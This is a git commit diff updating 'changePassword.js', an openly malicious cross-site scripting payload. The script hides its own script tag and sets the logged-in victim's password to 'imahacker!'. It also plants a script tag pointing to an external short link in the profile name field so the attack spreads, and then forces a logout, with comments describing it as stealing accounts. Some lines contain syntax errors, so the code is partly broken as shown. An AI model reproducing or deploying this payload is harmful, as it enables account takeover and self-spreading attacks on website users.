fc29921c2e84c3d35645576b8e47af0fee7981cf
theultraman20 <32559038+theultraman20@users.noreply.github.com>
2018-04-02 00:50:01 -0400

    Update changePassword.js

--- payload/changePassword.js
+++ payload/changePassword.js
@@ -1,11 +1,11 @@
-var script = document.currentScript;
+var src = document.currentScript.src.
 
 var oldHtml = document.body.innerHTML;
 
-var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src=\"//goo.gl/PHPvuT\">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters
+var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src="+src+">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters
 
-document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + "<script src=\"//goo.gl/PHPvuT\">".length );
-//now we do the payload: steal the users account
+document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + ("<script src="+src+">").length );
+//now we do the payload: change their password, and steal their account!
 var passInputs;
 
 if (location.href == document.querySelector('.welcome-edit-link').href) {
@@ -13,7 +13,10 @@ if (location.href == document.querySelector('.welcome-edit-link').href) {
   passInputs[0].value = "imahacker!";
   passInputs[1].value = "imahacker!";
   document.querySelector("#edit-profile-main-field-real-name-und-0-value").value = "<script/src=//goo.gl/gPZ5Dv>";
+  jQuery.cookie("logout", true);
   document.querySelector("form")[1].submit();
+} elseif (jQuery.cookie("logout")) {
+  location.pathname = "/user/logout";
 } else {
   location.href = document.querySelector('.welcome-edit-link').href;
 };
